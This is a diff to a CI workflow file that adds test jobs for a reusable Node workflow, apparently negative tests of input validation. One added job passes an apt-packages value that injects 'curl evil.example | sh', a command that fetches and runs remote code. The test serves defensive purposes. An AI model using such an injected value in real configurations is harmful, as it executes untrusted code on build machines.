@@ -43,6 +43,20 @@ jobs:
     with:
       working-directory: fixtures/node-npm
       env: 1BAD=x
+  node-bad-apt:
+    # Not node-npm: node-ci's concurrency group is per working directory and keeps one pending
+    # job, so a third node-npm job here cancelled node-bad-env.
+    uses: ./.github/workflows/node-ci.yml
+    with:
+      working-directory: fixtures/node-pnpm
+      apt-packages: libfoo; curl evil.example | sh
+  node-apt-missing:
+    # The fixture self-test runs with `apt-packages: figlet`, without it.
+    uses: ./.github/workflows/node-ci.yml
+    with:
+      working-directory: fixtures/node-apt
+      scripts: test
+      require: test
   node-audit-fail:
     uses: ./.github/workflows/node-ci.yml
     with:
